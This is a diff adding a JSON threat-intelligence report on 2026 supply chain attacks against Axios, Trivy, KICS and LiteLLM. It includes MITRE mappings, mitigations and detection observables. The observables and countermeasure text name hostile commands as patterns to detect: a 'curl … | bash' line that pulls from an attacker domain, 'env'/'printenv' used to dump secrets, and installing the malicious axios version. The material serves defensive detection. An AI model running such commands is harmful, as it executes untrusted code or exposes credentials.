@@ -1,0 +1,252 @@
+{
+  "id": "5cd24b8d-1adf-4728-ae82-6e3eeaef302c",
+  "slug": "developer-tools-targeted-in-wave-of-supply-chain-attacks",
+  "headline": "Open Source Under Siege: Axios, Trivy, and LiteLLM Hit by Supply Chain Attacks",
+  "title": "Wave of Supply Chain Attacks Compromises Critical Open-Source Developer Tools",
+  "summary": "A series of sophisticated supply chain attacks in March and April 2026 compromised several widely used open-source developer tools, exposing the fragility of the software ecosystem. The Axios JavaScript library, with nearly 100 million weekly downloads, was compromised by a suspected North Korean actor who published malicious versions. In a separate campaign, the criminal group TeamPCP targeted the Trivy vulnerability scanner, deploying the SANDCLOCK credential stealer to harvest CI/CD secrets. These stolen secrets were then used to inject malware into other projects like KICS and LiteLLM, demonstrating a cascading supply chain compromise.",
+  "full_report": "## Executive Summary\nThe open-source software ecosystem has been targeted by a wave of high-impact supply chain attacks, compromising critical developer tools and creating cascading risks for downstream users. In late March and early April 2026, several popular projects were poisoned, including the **Axios** JavaScript library, the **Trivy** vulnerability scanner, and AI gateway **LiteLLM**. In the **Axios** incident, a suspected North Korean threat actor compromised a maintainer's npm account to publish malicious versions of the library, forcing consumers like **[OpenAI](https://openai.com/)** to rotate security certificates. In a separate campaign, a group known as **TeamPCP** (or UNC6780) deployed **SANDCLOCK** malware to steal CI/CD secrets from developers contributing to **Trivy**. The attackers then used these stolen credentials to compromise other projects that used **Trivy** in their build pipelines, highlighting a strategic focus on attacking the automated software development lifecycle itself.\n\n## Threat Overview\nThese incidents represent a strategic shift by threat actors to target the software supply chain at its source. Instead of attacking end-user organizations directly, they are compromising the very tools developers use, poisoning the well for thousands of downstream projects and companies.\n\n### Axios Incident (March 31, 2026)\n*   **Target**: The `axios` package on the npm registry, a JavaScript library with ~100 million weekly downloads.\n*   **Attacker**: Suspected North Korean state-sponsored actor (per Google's Threat Intelligence Group).\n*   **Vector**: The attacker compromised the npm account of a project maintainer, likely via credential theft or session hijacking ([`T1078 - Valid Accounts`](https://attack.mitre.org/techniques/T1078/)).\n*   **Action**: The attacker published malicious versions of **Axios** (e.g., v1.14.1) containing credential-stealing malware.\n*   **Impact**: Any developer or CI/CD pipeline that pulled the malicious version during the compromise window was affected. **OpenAI** confirmed its macOS app-signing workflow downloaded a malicious version, prompting them to revoke and rotate certificates as a precaution.\n\n### Trivy/SANDCLOCK Incident (March-April 2026)\n*   **Target**: Developers and CI/CD environments associated with the **Trivy** vulnerability scanner.\n*   **Attacker**: Cybercriminal group **TeamPCP** (UNC6780).\n*   **Vector**: The group deployed a credential-stealing malware named **SANDCLOCK**.\n*   **Action**: **SANDCLOCK** was designed to extract sensitive data from developer environments, including CI/CD environment variables, cloud credentials (AWS, GCP), and Kubernetes configuration files.\n*   **Cascading Impact**: Using secrets stolen from the **Trivy** compromise, **TeamPCP** then pivoted to attack other open-source projects that used **Trivy** in their development pipelines, such as **KICS** and **LiteLLM**. They injected malware into these projects, propagating the compromise down the supply chain.\n\n## Technical Analysis\nThese attacks highlight a focus on CI/CD pipelines as a primary target.\n*   **Credential Theft is Key**: Both attacks hinged on obtaining legitimate credentials—an npm account for Axios, and CI/CD secrets for Trivy. This allows attackers to perform actions that appear legitimate, bypassing many security controls.\n*   **Abuse of Package Managers**: The Axios attack demonstrates the risk of package manager repositories like npm. A single compromised maintainer account can be used to distribute malware to millions of users.\n*   **Targeting the Pipeline**: The TeamPCP campaign shows a deep understanding of modern software development. By stealing CI/CD secrets ([`T1552.006 - Unsecured Credentials: CI/CD Secrets`](https://attack.mitre.org/techniques/T1552/006/)), they can gain privileged access to code repositories, artifact registries, and cloud environments, allowing them to inject malicious code at multiple points in the development lifecycle.\n\n### MITRE ATT&CK Mapping\n*   **[`T1195.001 - Compromise Software Supply Chain: Compromise Third-party Software/Service`](https://attack.mitre.org/techniques/T1195/001/)**: The core technique in all incidents.\n*   **[`T1078 - Valid Accounts`](https://attack.mitre.org/techniques/T1078/)**: Used to gain access to the Axios npm account.\n*   **[`T1552.006 - Unsecured Credentials: CI/CD Secrets`](https://attack.mitre.org/techniques/T1552/006/)**: The primary target of the SANDCLOCK malware in the Trivy attack.\n*   **[`T1105 - Ingress Tool Transfer`](https://attack.mitre.org/techniques/T1105/)**: The SANDCLOCK malware was transferred to developer environments.\n*   **[`T1555 - Credentials from Password Stores`](https://attack.mitre.org/techniques/T1555/)**: A general capability of credential-stealing malware.\n\n## Impact Assessment\nThe impact of these attacks is systemic and far-reaching.\n*   **Erosion of Trust**: These incidents erode trust in the open-source ecosystem, which is the foundation of modern software development.\n*   **Widespread Potential Compromise**: Given the popularity of tools like Axios and Trivy, thousands of organizations may have unknowingly incorporated malicious code into their products or been exposed to credential theft.\n*   **Costly Remediation**: Downstream victims like **OpenAI** must engage in costly and time-consuming remediation efforts, such as rotating certificates, scanning codebases, and investigating potential breaches.\n*   **Demonstration of Cascading Risk**: The Trivy incident is a perfect example of a cascading failure, where the compromise of one component leads to the compromise of many others that depend on it.\n\n## Cyber Observables for Detection\n| Type | Value | Description | Context | Confidence |\n|---|---|---|---|---|\n| log_source | `CI/CD Pipeline Logs` | Look for build steps that download unexpected package versions or execute suspicious commands. | Jenkins, GitLab CI, GitHub Actions logs. | medium |\n| command_line_pattern | `env` or `printenv` | Attackers often run these commands in a compromised CI/CD environment to dump all environment variables and secrets. | CI/CD pipeline execution logs. | high |\n| network_traffic_pattern | `Outbound traffic from build agents` | Monitor for build agents making network connections to unknown or suspicious domains, which could indicate C2 or data exfiltration. | Egress firewall logs, VPC flow logs. | medium |\n\n## Detection & Response\n1.  **Software Bill of Materials (SBOM)**: Maintain a detailed and up-to-date SBOM for all applications to quickly identify if a compromised package version (like the malicious Axios release) is in use.\n2.  **CI/CD Log Monitoring**: Ingest and analyze CI/CD pipeline logs in a SIEM. Alert on suspicious commands, access to secret stores, or anomalous network activity from build agents. This is an application of **[D3-PA: Process Analysis](https://d3fend.mitre.org/technique/d3f:ProcessAnalysis)** to the build environment.\n3.  **Dependency Pinning**: Pin all software dependencies to specific, known-good versions. Use a lockfile (`package-lock.json`, `yarn.lock`) and verify its integrity. Alert on any builds that attempt to use a different version.\n\n## Mitigation\nSecuring the software supply chain requires a multi-layered approach.\n1.  **Enforce MFA for Developers**: All developer accounts with access to code repositories, package managers (npm, PyPI), and CI/CD systems must be protected with phishing-resistant MFA. This is a critical control, as per **[M1032 - Multi-factor Authentication](https://attack.mitre.org/mitigations/M1032/)**.\n2.  **Least Privilege in CI/CD**: CI/CD jobs should run with the minimum permissions necessary. Use short-lived, single-purpose credentials instead of long-lived static secrets wherever possible. This aligns with **[M1026 - Privileged Account Management](https://attack.mitre.org/mitigations/M1026/)**.\n3.  **Vet Dependencies**: Use vulnerability scanning tools (like a trusted version of Trivy) and services like Snyk or Dependabot to scan dependencies for known vulnerabilities and malicious code.\n4.  **Isolate Build Environments**: Run CI/CD jobs in ephemeral, isolated environments with no access to the broader corporate network. The network access for build agents should be strictly controlled and monitored.",
+  "twitter_post": "Open source under siege! Popular dev tools like Axios, Trivy & LiteLLM hit by supply chain attacks. Attackers used compromised credentials to inject credential-stealing malware into CI/CD pipelines. 👨‍💻 #SupplyChain #OpenSource #DevSecOps",
+  "meta_description": "A series of supply chain attacks have compromised critical open-source developer tools including Axios and Trivy, leading to credential theft and cascading compromises through CI/CD pipelines.",
+  "category": [
+    "Supply Chain Attack",
+    "Malware",
+    "Threat Actor"
+  ],
+  "severity": "high",
+  "entities": [
+    {
+      "name": "TeamPCP",
+      "type": "threat_actor"
+    },
+    {
+      "name": "UNC6780",
+      "type": "threat_actor"
+    },
+    {
+      "name": "SANDCLOCK",
+      "type": "malware"
+    },
+    {
+      "name": "Axios",
+      "type": "product"
+    },
+    {
+      "name": "Trivy",
+      "type": "product"
+    },
+    {
+      "name": "KICS",
+      "type": "product"
+    },
+    {
+      "name": "LiteLLM",
+      "type": "product"
+    },
+    {
+      "name": "OpenAI",
+      "type": "company",
+      "url": "https://openai.com/"
+    },
+    {
+      "name": "Checkmarx",
+      "type": "vendor"
+    },
+    {
+      "name": "Google Threat Intelligence Group",
+      "type": "security_organization"
+    },
+    {
+      "name": "npm",
+      "type": "technology"
+    }
+  ],
+  "cves": [],
+  "sources": [
+    {
+      "url": "https://www.theregister.com/2026/04/11/axios_trivy_supply_chain/",
+      "title": "Two different attackers poisoned popular open source tools",
+      "date": "2026-04-09",
+      "friendly_name": "The Register",
+      "website": "theregister.com"
+    },
+    {
+      "url": "https://openai.com/blog/our-response-to-the-axios-developer-tool-compromise",
+      "title": "Our response to the Axios developer tool compromise",
+      "date": "2026-04-10",
+      "friendly_name": "OpenAI",
+      "website": "openai.com"
+    },
+    {
+      "url": "https://thehackernews.com/2026/04/openai-revokes-macos-app-certificate.html",
+      "title": "OpenAI Revokes macOS App Certificate After Malicious Axios Supply Chain Incident",
+      "date": "2026-04-10",
+      "friendly_name": "The Hacker News",
+      "website": "thehackernews.com"
+    },
+    {
+      "url": "https://www.csa.gov.sg/alerts-and-advisories/advisories/ad-2026-003",
+      "title": "Advisory on Securing the Software Supply Chain and Development Workflows",
+      "date": "2026-04-09",
+      "friendly_name": "Cyber Security Agency of Singapore (CSA)",
+      "website": "csa.gov.sg"
+    }
+  ],
+  "events": [
+    {
+      "datetime": "2026-03-31",
+      "summary": "An attacker compromises an Axios maintainer's npm account and publishes malicious versions of the library."
+    },
+    {
+      "datetime": "2026-04-01T00:00:00Z",
+      "summary": "TeamPCP group begins targeting Trivy developers with SANDCLOCK malware, leading to cascading compromises of KICS and LiteLLM."
+    },
+    {
+      "datetime": "2026-04-10",
+      "summary": "OpenAI announces it is revoking macOS app certificates as a precaution after its build systems downloaded a malicious version of Axios."
+    }
+  ],
+  "mitre_techniques": [
+    {
+      "id": "T1195.001",
+      "name": "Compromise Software Supply Chain: Compromise Third-party Software/Service",
+      "tactic": "Initial Access"
+    },
+    {
+      "id": "T1078",
+      "name": "Valid Accounts",
+      "tactic": "Defense Evasion, Persistence, Initial Access"
+    },
+    {
+      "id": "T1552.006",
+      "name": "Unsecured Credentials: CI/CD Secrets",
+      "tactic": "Credential Access"
+    },
+    {
+      "id": "T1040",
+      "name": "Network Sniffing",
+      "tactic": "Credential Access"
+    },
+    {
+      "id": "T1539",
+      "name": "Steal Web Session Cookie",
+      "tactic": "Credential Access"
+    }
+  ],
+  "mitre_mitigations": [
+    {
+      "id": "M1032",
+      "name": "Multi-factor Authentication",
+      "d3fend_techniques": [
+        {
+          "id": "D3-MFA",
+          "name": "Multi-factor Authentication",
+          "url": "https://d3fend.mitre.org/technique/d3f:Multi-factorAuthentication"
+        }
+      ],
+      "description": "Enforce strong, phishing-resistant MFA on all developer accounts, especially for code repositories and package manager registries."
+    },
+    {
+      "id": "M1026",
+      "name": "Privileged Account Management",
+      "description": "Apply least privilege principles to CI/CD pipelines, using short-lived, narrowly-scoped credentials instead of static, over-privileged secrets."
+    },
+    {
+      "id": "M1037",
+      "name": "Filter Network Traffic",
+      "description": "Strictly control and monitor outbound network access from build environments to prevent data exfiltration and C2 communication."
+    },
+    {
+      "id": "M1054",
+      "name": "Software Configuration",
+      "description": "Use dependency pinning and lockfiles to ensure that builds use only specific, vetted versions of third-party libraries."
+    }
+  ],
+  "d3fend_countermeasures": [
+    {
+      "technique_id": "D3-MFA",
+      "technique_name": "Multi-factor Authentication",
+      "url": "https://d3fend.mitre.org/technique/d3f:Multi-factorAuthentication",
+      "recommendation": "The compromise of the Axios maintainer's npm account underscores the absolute necessity of enforcing Multi-factor Authentication for all individuals involved in the software supply chain. Development organizations must mandate the use of strong, phishing-resistant MFA (like FIDO2 security keys) for all accounts with publishing rights to package managers (npm, PyPI, etc.), access to source code repositories (GitHub, GitLab), and administrative access to CI/CD systems. This single control would have likely prevented the Axios incident, as the attacker would not have been able to publish the malicious package even with a stolen password. This is not just a recommendation for internal developers but should be a requirement for any open-source project an organization critically depends on.",
+      "mitre_mitigation_id": "M1032"
+    },
+    {
+      "technique_id": "D3-PA",
+      "technique_name": "Process Analysis",
+      "url": "https://d3fend.mitre.org/technique/d3f:ProcessAnalysis",
+      "recommendation": "To counter threats like SANDCLOCK within the build environment, organizations must apply Process Analysis to their CI/CD pipelines. This involves treating the build agent as a critical endpoint. Security teams should ingest CI/CD logs into a SIEM and create alerts for anomalous behavior. For example, a build script for a linter should not be spawning shell commands like `env` to dump secrets, nor should it be making outbound network connections to unknown domains. By baselining the expected behavior of build jobs (e.g., 'this job only runs `npm install` and `npm test`'), any deviation, such as the execution of `curl` or `wget` to download an external script, can be flagged as a high-confidence indicator of compromise. This provides a crucial detection layer within the automated pipeline itself.",
+      "mitre_mitigation_id": "M1049"
+    }
+  ],
+  "iocs": [],
+  "cyber_observables": [
+    {
+      "type": "command_line_pattern",
+      "value": "npm install axios@1.14.1",
+      "description": "The specific command that would install the known malicious version of Axios. Searching for this in build logs can identify compromised pipelines.",
+      "context": "CI/CD pipeline logs, developer shell history.",
+      "confidence": "high"
+    },
+    {
+      "type": "file_name",
+      "value": "sandclock.py",
+      "description": "Potential filename for the SANDCLOCK credential stealer if dropped to disk in a developer or CI/CD environment.",
+      "context": "Endpoint file system scans, EDR.",
+      "confidence": "medium"
+    },
+    {
+      "type": "command_line_pattern",
+      "value": "curl -s [attacker_domain] | bash",
+      "description": "A common pattern where malicious code is downloaded and executed directly in a CI/CD pipeline, often used to deploy stealers like SANDCLOCK.",
+      "context": "CI/CD pipeline logs.",
+      "confidence": "high"
+    }
+  ],
+  "tags": [
+    "supply chain attack",
+    "open source",
+    "axios",
+    "trivy",
+    "npm",
+    "ci/cd security",
+    "sandclock"
+  ],
+  "extract_datetime": "2026-04-10T15:00:00.000Z",
+  "article_type": "NewsArticle",
+  "impact_scope": {
+    "geographic_scope": "global",
+    "companies_affected": [
+      "OpenAI",
+      "Checkmarx"
+    ],
+    "industries_affected": [
+      "Technology"
+    ],
+    "other_affected": [
+      "Users of Axios, Trivy, KICS, LiteLLM",
+      "Open-source software users"
+    ]
+  },
+  "pub_date": "2026-04-10",
+  "reading_time_minutes": 5,
+  "createdAt": "2026-04-10T15:00:00.000Z",
+  "updatedAt": "2026-04-29T00:00:00Z",
+  "updates": [
+    {
+      "update_id": "update-1",
+      "update_date": "2026-04-29T00:00:00Z",
+      "datetime": "2026-04-29T00:00:00Z",
+      "title": "Update 1",
+      "summary": "Checkmarx confirms data theft, source code leak by Lapsus$ following Trivy-linked supply chain attack; Bitwarden also impacted.",
+      "sources": [
+        {
+          "title": "Ongoing supply-chain attack 'explicitly targeting' security, dev tools",
+          "url": "https://www.theregister.com/2026/04/27/checkmarx_supply_chain_attack/"
+        },
+        {
+          "title": "Checkmarx Confirms Data Stolen in Supply Chain Attack",
+          "url": "https://www.securityweek.com/checkmarx-confirms-data-stolen-in-supply-chain-attack/"
+        }
+      ]
+    }
+  ]
+}
